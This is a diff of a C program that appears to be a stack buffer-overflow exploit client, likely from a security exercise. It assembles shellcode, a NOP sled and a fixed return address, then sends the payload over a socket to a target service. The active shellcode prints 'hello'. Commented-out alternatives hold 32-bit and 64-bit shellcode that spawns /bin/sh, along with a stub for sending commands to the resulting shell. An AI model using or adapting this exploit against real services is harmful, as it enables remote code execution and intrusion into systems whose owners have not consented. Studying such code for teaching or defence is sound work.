@@ -4,43 +4,67 @@
 #include <unistd.h>
 #include <netdb.h>
 #include <stdio.h>
-#include <string.h>
 #include <stdlib.h>
 #include <errno.h>
 #include <arpa/inet.h>
 
+#include <string.h>
+
 
 int main(int argc, char* argv[]) {
 	
-	char shellcode[] = "\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f";
+	// Shellcode to print hello
+	unsigned char shellcode[] = "\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f";
+	int shell_len = 37;
 	
-	char ret[] = "\x01\xe7\xff\xff\xff\x7f";
-	printf("\nLength of return address: %d\n\n", strlen(ret));
+	// Shellcode to open a shell
+//	unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";
+//	int shell_len = 28;
 	
-	char msg[256];
+	// Another shellcode to open a shell
+//	unsigned char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
+//	int shell_len = 27;
+	
+	
+	unsigned char ret[] = "\xf0\xe5\xff\xff\xff\x7f";
+//	unsigned char ret[] = "\x7f\xff\xff\xff\xe5\xf0";
+	
+	unsigned char msg[256];
 	memset(msg, 0, 256);
 	
 	
-	// The total length of greeting_text
+	// The total length of msg
 	int n = atoi(argv[1]);
-	int NOP_len = n - strlen(shellcode) - 18;
+	int NOP_len = n - shell_len - 6;
 	
-	
+	// The payload
+	for (int k = 0; k < shell_len; k++) {
+		msg[k] = shellcode[k];
+	}
+		
 	// The NOP-slide
-	for (int k = 0; k < NOP_len; k++) {
+	for (int k = shell_len; k < shell_len + NOP_len; k++) {
 		msg[k] = '\x90';
 	}
-
-	// The payload
-	strcat(msg, shellcode);
 	
 	// The return address
-	strcat(msg, ret);
+	for (int k = 0; k < 6; k++) {
+		msg[k + shell_len + NOP_len] = ret[k];
+	}
 	
 	// Adding the \n so fgets returns
-	strcat(msg, "\n");
+	msg[shell_len + NOP_len + 6] = '\n';
+	
+	
 	
 	printf("msg: %s\n", msg);
+	/*
+	for (int k = 0; k < shell_len + NOP_len + 10; k++) {
+		printf("%d: %x\n", k, msg[k]);
+	}
+	*/
+	
+	
 	
 	// Building destination addr_in
 	struct sockaddr_in dest;
@@ -61,7 +85,7 @@ int main(int argc, char* argv[]) {
 		printf("Failed to connect");
   		exit(1);
 	} else {
-		printf("Connected successfully\n\n");
+		printf("\nConnected successfully\n\n");
 	}
 
 	
@@ -77,19 +101,36 @@ int main(int argc, char* argv[]) {
 	
 	
 	// Sending name
-	if (send(sockfd, msg, strlen(msg), 0) != strlen(msg)) {
+	if (send(sockfd, msg, n + 1, 0) != n + 1) {
 		printf("Failed to send message entirely");
   		exit(1);
 	} else {
-		printf("Message sent\n\n");
+		printf("Attack sent\n\n");
 	}
+	
+	
+	/*
+	// Sending command to be executed
+	char command[] = "ls";
+	if (send(sockfd, command, strlen(command), 0) != strlen(command)) {
+		printf("Failed to send message entirely");
+  		exit(1);
+	} else {
+		printf("Command sent\n\n");
+	}
+	*/
+	
 	
 	// Reply
 	memset(recvbuf, 0, buf_len);
-	if (recv(sockfd, recvbuf, buf_len, 0) == -1) {
-		printf("Error receiving message");
+	int recv_status = recv(sockfd, recvbuf, buf_len, 0);
+	if (recv_status == -1) {
+		printf("Error receiving message: %d\n\n", errno);
   		exit(1);
+	} else if (recv_status == 0) {
+		printf("Connection terminated\n");
 	}
+	
 	printf("%s\n", recvbuf);
 	
 	return 0;
